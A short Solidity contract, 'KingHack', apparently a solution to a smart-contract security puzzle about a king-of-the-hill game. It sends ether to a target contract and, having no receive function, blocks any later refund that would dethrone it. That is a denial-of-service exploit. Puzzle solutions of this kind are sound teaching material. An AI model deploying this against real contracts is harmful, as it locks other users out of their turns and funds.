// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    function breakKingGame(address targetContract) public payable {
        (bool success,) = payable(targetContract).call{value:msg.value}("");
        if (!success) {
            revert('Failed');
        }
    }
}